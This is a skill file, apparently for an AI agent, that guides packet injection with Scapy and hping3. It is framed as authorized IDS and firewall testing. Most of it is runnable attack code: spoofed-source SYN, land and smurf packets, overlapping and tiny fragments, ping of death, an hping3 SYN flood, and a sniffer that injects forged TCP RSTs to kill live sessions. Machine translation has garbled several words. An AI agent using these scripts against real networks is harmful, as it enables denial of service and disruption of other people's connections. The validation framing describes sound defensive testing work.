---
name: performing-packet-injection-attack
description: Crafts and injects custom network packets using Scapy, hping3, and Nemesis during authorized security assessments to test firewall rules, IDS Tespit, protocol handling, and network stack
  resilience against malformed and spoofed traffic.
tags:
- hping3
- packet-injection
- siber-güvenlik
- protocol-testing
- network-security
- fetih
- cybersecurity
- scapy
triggers:
- IDS
- IPS
- alert
- attack
- ağ güvenliği
- dns
- exploit
- firewall
- http
- injection
- log
- network
category: network-security
source_subdomain: network-security
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
adapted_for: fetih
---

# Performing Packet Injection Attack


## Ne Zaman Kullanılır

- Testing IDS/IPS rules by injecting traffic that should trigger specific Tespit signatures
- Validating firewall rules by crafting packets with specific flags, source addresses, and payloads
- Assessing network stack resilience to malformed packets, fragmentation attacks, and protocol violations
- Simulating spoofed traffic to test anti-spoofing controls (BCP38, uRPF)
- Performing TCP reset injection to test connection resilience and session hijacking scenarios

**Kullanma:** for denial-of-service attacks against production systems, for spoofing traffic to frame third parties, or without explicit authorization for the target network.

## Ön Gereksinimler

- Written authorization specifying in-scope targets and approved packet injection techniques
- Scapy, hping3, and Nemesis kurulu: the testing platform
- Root/sudo privileges for raw socket access and packet crafting
- Wireshark or tcpdump on the target side to verify packet delivery
- Understanding of TCP/IP protocol internals, header fields, and flag combinations

## İş Akışı

### Adım 1: Craft and Send Basic Test Packets with Scapy

```python
#!/usr/bin/env python3
"""Basic packet injection examples using Scapy for authorized testing."""

from scapy.all import *

syn = IP(dst="10.10.20.10") / TCP(dport=80, flags="S", seq=1000)
response = sr1(syn, timeout=2, verbose=0)
if response and response.haslayer(TCP):
    if response[TCP].flags == "SA":
        print(f"[*] Port 80 is OPEN (SYN-ACK received)")
    elif response[TCP].flags == "RA":
        print(f"[*] Port 80 is CLOSED (RST-ACK received)")

xmas = IP(dst="10.10.20.10") / TCP(dport=80, flags="FPU")
send(xmas, verbose=0)
print("[*] XMAS packet sent (should trigger IDS)")

null = IP(dst="10.10.20.10") / TCP(dport=80, flags="")
send(null, verbose=0)
print("[*] NULL packet sent")

icmp_custom = IP(dst="10.10.20.10") / ICMP(type=8) / Raw(load="SECURITY_TEST_PAYLOAD")
send(icmp_custom, verbose=0)
print("[*] Custom ICMP packet sent")

udp_test = IP(dst="10.10.20.10") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="test.example.com"))
response = sr1(udp_test, timeout=2, verbose=0)
if response:
    print(f"[*] DNS response received from {response[IP].src}")
```

### Adım 2: IP Spoofing and Anti-Spoofing Validation

```python
#!/usr/bin/env python3
"""Test anti-spoofing controls with spoofed source IP packets."""

from scapy.all import *

spoofed_syn = IP(src="192.0.2.100", dst="10.10.20.10") / TCP(dport=80, flags="S")
send(spoofed_syn, verbose=0)
print("[*] Sent SYN with spoofed source 192.0.2.100")

land = IP(src="10.10.20.10", dst="10.10.20.10") / TCP(sport=80, dport=80, flags="S")
send(land, verbose=0)
print("[*] Land attack packet sent (src==dst)")

smurf = IP(src="10.10.20.10", dst="10.10.20.255") / ICMP(type=8)
send(smurf, verbose=0)
print("[*] Smurf test packet sent (ICMP to broadcast)")

frag1 = IP(dst="10.10.20.10", flags="MF", frag=0) / TCP(dport=80, flags="S") / Raw(load="A"*24)
frag2 = IP(dst="10.10.20.10", frag=2) / Raw(load="B"*24)  # Overlapping fragment
send(frag1, verbose=0)
send(frag2, verbose=0)
print("[*] Overlapping IP fragments sent")
```

### Adım 3: TCP Session Manipulation

```bash
sudo hping3 -S -p 80 --rst -c 5 10.10.20.10

sudo hping3 -S --flood -V -p 80 -c 100 10.10.20.10

sudo hping3 -S -p 80 -w 0 -c 5 10.10.20.10  # Zero window
sudo hping3 -S -p 80 -w 65535 -c 5 10.10.20.10  # Max window

sudo hping3 -SA -p 80 -c 3 10.10.20.10
```

```python
#!/usr/bin/env python3
"""TCP RST injection to test session resilience."""

from scapy.all import *

def rst_inject(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
        rst = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
        ) / TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            seq=pkt[TCP].ack,
            flags="R"
        )
        send(rst, verbose=0)
        print(f"[*] RST injected: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")

print("[*] Listening for TCP ACK packets to inject RST...")
sniff(filter="tcp and host 10.10.20.10", prn=rst_inject, count=10, iface="eth0")
```

### Adım 4: Protocol Anomaly Testing

```python
#!/usr/bin/env python3
"""Protocol anomaly packets for IDS/firewall testing."""

from scapy.all import *

target = "10.10.20.10"

pod = IP(dst=target) / ICMP() / Raw(load="X" * 65500)
send(fragment(pod), verbose=0)
print("[*] Ping of Death fragments sent")

tiny_frag = IP(dst=target, flags="MF", frag=0) / Raw(load=bytes(TCP(dport=80, flags="S"))[:8])
tiny_frag2 = IP(dst=target, frag=1) / Raw(load=bytes(TCP(dport=80, flags="S"))[8:])
send(tiny_frag, verbose=0)
send(tiny_frag2, verbose=0)
print("[*] Tiny fragment attack packets sent")

invalid_flags = [
    ("SYN+FIN", "SF"),
    ("SYN+RST", "SR"),
    ("FIN only (no session)", "F"),
    ("All flags", "FSRPAUEC"),
]

for name, flags in invalid_flags:
    pkt = IP(dst=target) / TCP(dport=80, flags=flags)
    send(pkt, verbose=0)
    print(f"[*] Sent packet with invalid flags: {name}")

ttl_evade = IP(dst=target, ttl=3) / TCP(dport=80, flags="S")
send(ttl_evade, verbose=0)
print("[*] Low-TTL evasion packet sent (TTL=3)")

ip_opts = IP(dst=target, options=[IPOption_RR()]) / TCP(dport=80, flags="S")
send(ip_opts, verbose=0)
print("[*] Packet with IP Record Route option sent")
```

### Adım 5: Verify IDS Tespit

```bash
grep -i "xmas\|null\|land\|smurf\|ping.of.death\|fragment" /var/log/suricata/eve.json | \
  python3 -m json.tool | head -50


sudo iptables -L -n -v | grep -i drop

dmesg | grep -i "fragment\|frag"
```

### Adım 6: Document Results

```bash
cat > packet_injection_report.txt << 'EOF'
Packet Injection Test Results
=============================
Date: $(date)
Target: 10.10.20.10
Tester: Security Assessment Team

Test 1: TCP XMAS Scan
  IDSDetect YES (Suricata SID 2100330)
  Firewall Action: Dropped

Test 2: IP Spoofing (192.0.2.100)
  uRPF Block: YES (packet dropped at edge router)
  IDSDetect YES (source not in HOME_NET)

Test 3: Fragmentation Overlap
  IDSDetect YES (stream reassembly anomaly)
  Target Response: Fragments dropped by OS

Test 4: Invalid TCP Flags
  IDSDetect YES (SYN+FIN, SYN+RST flagged)
  Firewall Action: Dropped
EOF
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Packet Injection** | Crafting and sending network packets with specific header values, payloads, or flag combinations to test network security controls |
| **IP Spoofing** | Setting a false source IP address in crafted packets to test anti-spoofing controls (BCP38, uRPF) or impersonate another host |
| **TCP RST Injection** | Sending forged TCP RST packets to terminate established connections, testing session resilience and connection reset defenses |
| **Fragmentation Attack** | Exploiting IP fragmentation to split malicious payloads across fragments, evading packet Denetle:ion that does not reassemble fragments |
| **uRPF (Unicast Reverse Path Forwarding)** | Router-level anti-spoofing mechanism that drops packets if the source IP would not be routable back through the ingress interface |
| **BCP38 (Network Ingress Filtering)** | Best Current Practice for preventing IP spoofing at network borders by filtering packets with source addresses not belonging to the network |

## Tools & Systems

- **Scapy**: Python packet manipulation library for crafting arbitrary network packets with full control over all protocol headers
- **hping3**: Command-line packet generator supporting TCP, UDP, ICMP with control over flags, TTL, window size, and packet rate
- **Nemesis**: Network packet injection tool supporting Ethernet, ARP, IP, TCP, UDP, ICMP, DNS, and other protocols
- **tcpreplay**: Tool for replaying captured PCAP files at controlled rates for testing IDS rules against known traffic patterns
- **Nping**: Nmap's packet generation tool for crafting probes with arbitrary TCP/UDP/ICMP headers

## Common Scenarios

### Scenario: Validating IDS Rules After Dağıt:ment

**Context**: A SOC team Dağıtılmış new Suricata rules for Tespit etme reconnaissance and evasion techniques. They need to validate that the rules trigger correctly before going live. The testing is performed in a staging environment replicating the production network.

**Approach**:
1. Craft XMAS, NULL, and FIN scan packets using Scapy and send to test targets to verify scan Tespit rules
2. Generate packets with invalid TCP flag combinations (SYN+FIN, SYN+RST) to test protocol anomaly rules
3. Send oversized ICMP packets and fragmented payloads to test fragmentation Tespit rules
4. Inject packets with spoofed source IPs to verify anti-spoofing rules fire correctly
5. Send TCP RST injection packets during an active HTTP session to test session disruption Tespit
6. Şunu doğrula: all expected Suricata alerts appear in the EVE JSON log with correct severity and metadata
7. Document which rules fired, which did not, and recommend rule tuning for any gaps

**Pitfalls**:
- Sending injection packets too fast and overwhelming the test network or IDS sensor
- Crafting packets with incorrect checksum calculations, causing them to be silently dropped before reaching the IDS
- Not accounting for stateful firewalls that drop out-of-state packets before they reach the IDS for Denetle:ion
- Testing from behind a NAT that modifies source ports and breaks crafted TCP sequences

## Output Format

```
## Packet Injection Test Report

**Target**: 10.10.20.10 (test-server-01)
**IDS Sensor**: suricata-staging-01
**Test Date**: 2024-03-15

### Test Matrix

| Test | Packet Type | Expected Tespit | Actual Result |
|------|-------------|-------------------|---------------|
| 1 | TCP XMAS Scan | SID 2100330 | tespit etme (ED) |
| 2 | TCP NULL Scan | SID 2100331 | tespit etme (ED) |
| 3 | SYN+FIN Invalid | SID 2100332 | tespit etme (ED) |
| 4 | IP Spoofed Source | SID 2003000 | tespit etme (ED) |
| 5 | Land Attack | SID 2100333 | NOT tespit etme (ED) |
| 6 | Fragment Overlap | SID 2200001 | tespit etme (ED) |
| 7 | Ping of Death | SID 2100334 | tespit etme (ED) |
| 8 | TCP RST Injection | Custom SID | NOT tespit etme (ED) |

### Tespit Rate: 6/8 (75%)

### Gaps Identified
1. Land attack (src==dst) not Detected -- add rule SID 2100333
2. TCP RST injection not Detected -- create custom rule for out-of-window RST
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 2d0ed33c3b293e6f
-->

